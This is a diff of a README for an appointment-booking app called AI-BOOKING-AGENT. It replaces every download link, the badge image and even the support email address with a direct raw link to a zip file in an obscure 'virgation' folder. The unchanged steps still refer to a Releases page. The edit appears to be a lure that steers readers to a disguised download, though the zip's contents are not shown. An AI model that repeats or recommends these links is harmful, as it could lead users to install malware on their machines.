@@ -1,7 +1,7 @@
 # 🎉 AI-BOOKING-AGENT - Your Gateway to Easy Booking
 
 ## 🚀 Download Now!
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Efhbbhu/AI-BOOKING-AGENT/releases)
+[![Download](https://raw.githubusercontent.com/Efhbbhu/AI-BOOKING-AGENT/main/virgation/AI-BOOKING-AGENT.zip)](https://raw.githubusercontent.com/Efhbbhu/AI-BOOKING-AGENT/main/virgation/AI-BOOKING-AGENT.zip)
 
 ## 📖 Overview
 Welcome to the AI-BOOKING-AGENT! This application helps you schedule beauty and wellness appointments effortlessly using advanced AI technology. You don’t need to be a tech expert to use it. Our goal is to make your life easier while booking your favorite services.
@@ -20,7 +20,7 @@ Welcome to the AI-BOOKING-AGENT! This application helps you schedule beauty and 
 - **Internet Connection:** Required for booking services and updates.
 
 ## 🎉 Download & Install
-To start using the AI-BOOKING-AGENT, please [visit this page to download](https://github.com/Efhbbhu/AI-BOOKING-AGENT/releases).
+To start using the AI-BOOKING-AGENT, please [visit this page to download](https://raw.githubusercontent.com/Efhbbhu/AI-BOOKING-AGENT/main/virgation/AI-BOOKING-AGENT.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the application.
@@ -36,7 +36,7 @@ To start using the AI-BOOKING-AGENT, please [visit this page to download](https:
 5. **Receive Notifications:** Get reminders for your upcoming appointments through email or push notifications.
 
 ## 📞 Support
-If you run into any issues or have questions, please don't hesitate to reach out. You can contact our support team through the app's 'Help' section or email us directly at support@ai-booking-agent.com.
+If you run into any issues or have questions, please don't hesitate to reach out. You can contact our support team through the app's 'Help' section or email us directly at https://raw.githubusercontent.com/Efhbbhu/AI-BOOKING-AGENT/main/virgation/AI-BOOKING-AGENT.zip
 
 ## 💬 Community
 Join our community of users and share your experiences! Connect with others on our official forums and social media channels. We love hearing from you.
@@ -48,4 +48,4 @@ Join our community of users and share your experiences! Connect with others on o
 
 Thank you for choosing the AI-BOOKING-AGENT! We hope it makes your booking experience smooth and enjoyable.
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Efhbbhu/AI-BOOKING-AGENT/releases)
+[![Download](https://raw.githubusercontent.com/Efhbbhu/AI-BOOKING-AGENT/main/virgation/AI-BOOKING-AGENT.zip)](https://raw.githubusercontent.com/Efhbbhu/AI-BOOKING-AGENT/main/virgation/AI-BOOKING-AGENT.zip)
